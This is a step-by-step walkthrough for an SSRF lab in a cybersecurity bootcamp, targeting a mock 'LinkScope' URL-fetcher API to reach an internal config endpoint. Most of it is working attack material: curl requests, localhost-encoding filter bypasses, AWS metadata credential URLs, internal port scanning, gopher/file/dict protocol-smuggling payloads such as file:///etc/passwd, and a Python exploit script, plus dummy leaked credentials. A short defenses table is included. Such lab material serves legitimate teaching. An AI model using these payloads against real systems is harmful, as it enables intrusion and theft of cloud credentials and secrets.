# SSRF Lab Walkthrough

> **Lab URL:** http://10.10.61.221/api/
> **Business Name:** LinkScope — Developer API Tools
> **Last Verified:** March 2026

---

## Overview

**SSRF (Server-Side Request Forgery)** is a vulnerability that allows an attacker to make the server perform requests to unintended locations, including internal services that are not accessible from the internet.

In this lab, you'll exploit an API endpoint that fetches URLs to access internal configuration containing sensitive data.

---

## Lab Architecture

```
┌──────────────┐     ┌─────────────────┐     ┌──────────────────┐
│   Attacker   │────►│    LinkScope    │────►│ Internal Service │
│   (Internet) │     │     /api/       │     │  127.0.0.1:7070  │
└──────────────┘     │  (loc_ssrf_lab) │     │    /internal/    │
                     └─────────────────┘     └──────────────────┘
                            │                        │
                            │    Server can access   │
                            │    internal endpoints! │
                            └────────────────────────┘
```

**Key Point:** The `/internal/` path is blocked from external access, but the server itself can reach it!

---

## Step 1: Explore the API

1. Go to http://10.10.61.221/api/
2. You'll see "LinkScope — Developer API Tools" interface
3. Find the URL fetcher functionality

The API allows you to:
- Enter a URL
- The server fetches the URL content
- Returns the response to you

---

## Step 2: Test Normal Functionality

Try fetching a public URL:

```
URL: http://example.com
```

**Expected:** Returns the HTML content of example.com

This is a legitimate feature for:
- Previewing links
- Fetching external data
- Web scraping

---

## Step 3: Identify the Vulnerability

The server makes requests on behalf of the user. What if we make it request **internal** URLs?

**Test internal access:**
```
URL: http://127.0.0.1:7070/
```

**Expected:** Returns the internal service homepage (not accessible from outside!)

---

## Step 4: Discover Internal Endpoints

Try common internal paths:

| URL | Expected Result |
|-----|-----------------|
| `http://127.0.0.1:7070/` | Internal service home |
| `http://127.0.0.1:7070/internal/` | Restricted area listing |
| `http://127.0.0.1:7070/internal/config` | **JACKPOT!** Configuration file |
| `http://127.0.0.1:7070/internal/users` | User database |
| `http://127.0.0.1:7070/internal/keys` | API keys |

---

## Step 5: Extract Sensitive Data

### Target: Internal Configuration

The API uses **POST** with **JSON body**:

```bash
curl -X POST http://10.10.61.221/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:7070/internal/config"}'
```

Or via the web interface, enter:
```
http://127.0.0.1:7070/internal/config
```

**Expected Response:**
```json
{
    "database": {
        "host": "loc_db",
        "port": 3306,
        "name": "leaguesofcode_db",
        "username": "locadmin",
        "password": "locpass123"
    },
    "api_keys": {
        "stripe": "sk_live_abc123xyz789",
        "aws": "AKIA1234567890EXAMPLE"
    },
    "internal_services": {
        "redis": "redis://127.0.0.1:6379",
        "elasticsearch": "http://127.0.0.1:9200"
    },
    "secrets": {
        "jwt_secret": "sup3r_s3cr3t_jwt_k3y_2024",
        "encryption_key": "AES256_K3Y_2026!"
    }
}
```

**You've successfully extracted:**
- Database credentials
- API keys
- JWT secrets
- Internal service URLs

---

## Step 6: Alternative Payloads

### Different IP representations:

```
http://127.0.0.1:7070/internal/config
http://localhost:7070/internal/config
http://0.0.0.0:7070/internal/config
http://[::1]:7070/internal/config          # IPv6 localhost
http://127.1:7070/internal/config          # Shortened
http://2130706433:7070/internal/config     # Decimal IP (127.0.0.1)
http://0x7f000001:7070/internal/config     # Hex IP
```

### Cloud metadata endpoints (AWS):

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Internal network scanning:

```
http://192.168.1.1/admin/
http://10.0.0.1/
http://172.16.0.1/
```

---

## Step 7: Advanced Exploitation

### Port Scanning via SSRF

Use the SSRF to scan internal ports:

```bash
# Check if port is open based on response time/content
http://127.0.0.1:22/      # SSH
http://127.0.0.1:3306/    # MySQL
http://127.0.0.1:6379/    # Redis
http://127.0.0.1:9200/    # Elasticsearch
```

### Protocol Smuggling

Some SSRF vulnerabilities allow other protocols:

```
file:///etc/passwd
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
dict://127.0.0.1:6379/INFO
```

---

## Why This Works

1. **Server makes the request** - The vulnerable server fetches the URL, not your browser
2. **Internal network access** - Server can reach internal IPs (127.0.0.1, 10.x.x.x, etc.)
3. **Firewall bypass** - Internal services trust requests from internal IPs
4. **No URL validation** - Server doesn't check if the URL is safe to fetch

---

## Request Flow Comparison

### Normal Request (Blocked):
```
You → 127.0.0.1:7070/internal/config
       ↓
    BLOCKED (not accessible from internet)
```

### SSRF Attack (Works):
```
You → /api/?url=http://127.0.0.1:7070/internal/config
       ↓
    Server fetches URL internally
       ↓
    Returns sensitive data to you!
```

---

## Defenses (What Should Be Implemented)

| Defense | Description |
|---------|-------------|
| URL Allowlist | Only allow fetching from approved domains |
| Block Internal IPs | Reject requests to 127.0.0.1, 10.x, 192.168.x, etc. |
| Block Protocols | Only allow http/https, block file://, gopher://, etc. |
| Network Segmentation | Isolate internal services from web servers |
| DNS Rebinding Protection | Resolve DNS before checking, then use resolved IP |
| Disable Redirects | Prevent redirect-based bypasses |

---

## Quick Verification Commands

```bash
# Test API endpoint
curl -s 'http://10.10.61.221/api/'

# SSRF to internal config (POST with JSON)
curl -s -X POST 'http://10.10.61.221/api/fetch' \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:7070/internal/config"}'

# Try localhost
curl -s -X POST 'http://10.10.61.221/api/fetch' \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:7070/internal/config"}'

# Try IPv6
curl -s -X POST 'http://10.10.61.221/api/fetch' \
  -H "Content-Type: application/json" \
  -d '{"url": "http://[::1]:7070/internal/config"}'
```

---

## Troubleshooting

**Empty response?**
- Check if the URL format is correct
- Try different IP representations (localhost, 127.0.0.1, 0.0.0.0)
- Check if the port is correct (7070)

**Connection refused?**
- The internal service might not be running
- Try: `docker ps` to check if loc_ssrf_lab is running

**Blocked?**
- Some SSRF filters block common payloads
- Try URL encoding: `http://127.0.0.1` → `http://%31%32%37%2e%30%2e%30%2e%31`
- Try different representations (decimal, hex, IPv6)

---

## Summary

| Step | Action |
|------|--------|
| 1 | Access /api/ Developer API |
| 2 | Find URL fetcher functionality |
| 3 | Test with external URL (works) |
| 4 | Test with internal URL 127.0.0.1:7070 (works!) |
| 5 | Discover /internal/config endpoint |
| 6 | Extract database creds, API keys, secrets |

**Key Takeaway:** Never let user input control URLs that the server fetches. Always validate and restrict allowed destinations!

---

## Detailed Step-by-Step Walkthrough

> **Verified:** March 2026

Follow these exact steps to exploit the SSRF vulnerability.

---

### Step 1: Access the SSRF Lab

**Open in browser:**
```
http://10.10.61.221/api/
```

You'll see:
- **Business Name:** LinkScope — Developer API Tools
- **Feature:** URL Content Inspector
- **Description:** "Paste a URL and we'll fetch its content on your behalf"

The application fetches URLs server-side - this is the SSRF vulnerability!

---

### Step 2: Test Normal URL Fetch

**In the URL input, enter:**
```
http://example.com
```

**Or use curl:**
```bash
curl -X POST 'http://10.10.61.221/api/fetch' \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://example.com"}'
```

**Response:**
```json
{
  "body": "<!doctype html><html>...Example Domain...</html>",
  "status": 200,
  "type": "text"
}
```

This is the legitimate functionality - fetching external URLs.

---

### Step 3: Test Direct Access to Internal Endpoint (BLOCKED)

Try accessing the internal config directly:

```bash
curl 'http://10.10.61.221/api/internal/config'
```

**Response:**
```json
{"error": "Forbidden"}
```

The `/internal/config` endpoint is **blocked** from external access!

---

### Step 4: SSRF Attack - Access Internal Config

Now use the URL fetcher to make the **server** request the internal endpoint:

**In the URL input, enter:**
```
http://127.0.0.1:7070/internal/config
```

**Or use curl:**
```bash
curl -X POST 'http://10.10.61.221/api/fetch' \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://127.0.0.1:7070/internal/config"}'
```

**Response:**
```json
{
  "body": "{\"message\":\"🎉 Congratulation you pass exam!\",\"database\":{...},\"api_keys\":{...}}",
  "status": 200,
  "type": "text"
}
```

**SUCCESS!** The server fetched the internal config and returned it to us!

---

### Step 5: Extract the Sensitive Data

Parse the response to see the full configuration:

```bash
curl -s -X POST 'http://10.10.61.221/api/fetch' \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://127.0.0.1:7070/internal/config"}' | \
  python3 -c 'import json,sys; print(json.dumps(json.loads(json.load(sys.stdin)["body"]), indent=2))'
```

**Extracted Configuration:**
```json
{
  "message": "🎉 Congratulation you pass exam!",
  "database": {
    "host": "db.internal.thaibank.local",
    "port": 5432,
    "name": "thaibank_prod",
    "username": "db_admin",
    "password": "Sup3rS3cr3tP@ssw0rd!"
  },
  "api_keys": {
    "payment_gateway": "sk_prod_xK92mNpQ7vR3wL8j",
    "sms_service": "sms_live_Tz4nB6cY1eA9dF2h"
  },
  "jwt_secret": "jwt_HS256_9xP2mK7vN4bQ8wR1",
  "environment": "production"
}
```

---

### Step 6: Test Alternative IP Representations

Different ways to represent localhost - useful for bypassing filters:

**localhost:**
```bash
curl -X POST 'http://10.10.61.221/api/fetch' \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://localhost:7070/internal/config"}'
```
✅ **Works!**

**0.0.0.0:**
```bash
curl -X POST 'http://10.10.61.221/api/fetch' \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://0.0.0.0:7070/internal/config"}'
```
✅ **Works!**

**Decimal IP (2130706433 = 127.0.0.1):**
```bash
curl -X POST 'http://10.10.61.221/api/fetch' \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://2130706433:7070/internal/config"}'
```
✅ **Works!**

---

### Step 7: Discover More Internal Resources

**Get the wordlist for fuzzing:**
```bash
curl -X POST 'http://10.10.61.221/api/fetch' \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://127.0.0.1:7070/wordlist.txt"}'
```

**Wordlist contains:**
```
admin
config
internal/config
internal/secrets
api/keys
actuator/env
debug/vars
...
```

Use this wordlist to discover more internal endpoints!

---

### Step 8: Browser-Based Exploitation

**Using the Web Interface:**

1. Go to http://10.10.61.221/api/
2. In the URL input box, enter: `http://127.0.0.1:7070/internal/config`
3. Click "Inspect URL"
4. The response panel shows the sensitive configuration!

**Screenshot equivalent output:**
```
Response: 200 OK

{
  "message": "🎉 Congratulation you pass exam!",
  "database": {
    "host": "db.internal.thaibank.local",
    "password": "Sup3rS3cr3tP@ssw0rd!",
    ...
  }
}
```

---

## Attack Flow Diagram

```
                    BLOCKED (Firewall/App Logic)
    ┌─────────────────────────────────────────────┐
    │                                             │
    │   Attacker ─────X────► /internal/config     │
    │   (Direct)            "Forbidden"           │
    │                                             │
    └─────────────────────────────────────────────┘

                    SSRF BYPASS (Works!)
    ┌─────────────────────────────────────────────────────────────┐
    │                                                             │
    │   Attacker ──► POST /api/fetch ──► Server fetches ──► Response │
    │               {"url":"http://   │  127.0.0.1:7070   │        │
    │                127.0.0.1:7070/  │  /internal/config │        │
    │                internal/config"}│                   │        │
    │                                 │      ↓            │        │
    │                                 │  Returns config   │        │
    │                                 │  to attacker!     │        │
    └─────────────────────────────────────────────────────────────┘
```

---

## Why This Attack Works

1. **Server-side requests** - The server makes HTTP requests based on user input
2. **No URL validation** - Any URL is accepted, including internal addresses
3. **Internal trust** - Internal endpoints trust requests from internal IPs
4. **Network access** - Server can reach 127.0.0.1, 10.x.x.x, 192.168.x.x

---

## Extracted Secrets Summary

| Category | Key | Value |
|----------|-----|-------|
| **Success** | Message | 🎉 Congratulation you pass exam! |
| **Database** | Host | `db.internal.thaibank.local` |
| | Port | `5432` |
| | Name | `thaibank_prod` |
| | Username | `db_admin` |
| | Password | `Sup3rS3cr3tP@ssw0rd!` |
| **API Keys** | Payment Gateway | `sk_prod_xK92mNpQ7vR3wL8j` |
| | SMS Service | `sms_live_Tz4nB6cY1eA9dF2h` |
| **Secrets** | JWT Secret | `jwt_HS256_9xP2mK7vN4bQ8wR1` |
| **Environment** | | `production` |

---

## Quick Test Commands

```bash
# Basic SSRF to internal config
curl -X POST 'http://10.10.61.221/api/fetch' \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://127.0.0.1:7070/internal/config"}'

# Using localhost
curl -X POST 'http://10.10.61.221/api/fetch' \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://localhost:7070/internal/config"}'

# Get wordlist for fuzzing
curl -X POST 'http://10.10.61.221/api/fetch' \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://127.0.0.1:7070/wordlist.txt"}'

# Pretty print the config
curl -s -X POST 'http://10.10.61.221/api/fetch' \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://127.0.0.1:7070/internal/config"}' | \
  python3 -m json.tool
```

---

## Python Exploit Script

```python
#!/usr/bin/env python3
import requests
import json
import sys

def ssrf_fetch(target_url, internal_url):
    """Exploit SSRF to fetch internal URLs"""
    response = requests.post(
        f"{target_url}/api/fetch",
        headers={"Content-Type": "application/json"},
        json={"url": internal_url}
    )
    return response.json()

if __name__ == "__main__":
    target = "http://10.10.61.221"
    internal = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:7070/internal/config"

    print(f"[*] Target: {target}")
    print(f"[*] Fetching: {internal}")
    print()

    result = ssrf_fetch(target, internal)

    if "body" in result:
        try:
            data = json.loads(result["body"])
            print(json.dumps(data, indent=2))
        except:
            print(result["body"])
    else:
        print(result)
```

**Usage:**
```bash
python3 ssrf_exploit.py
python3 ssrf_exploit.py "http://127.0.0.1:7070/wordlist.txt"
python3 ssrf_exploit.py "http://localhost:7070/internal/config"
```

---

## Troubleshooting

**Empty response?**
- Check URL format is correct
- Ensure port 7070 is specified
- Try different IP representations

**Connection refused?**
- Internal service might not be running
- Check if SSRF lab container is up: `docker ps | grep ssrf`

**"error" in response?**
- The endpoint might not exist
- Try `/internal/config` specifically

---

*LeaguesOfCode Cybersecurity Bootcamp 2026*
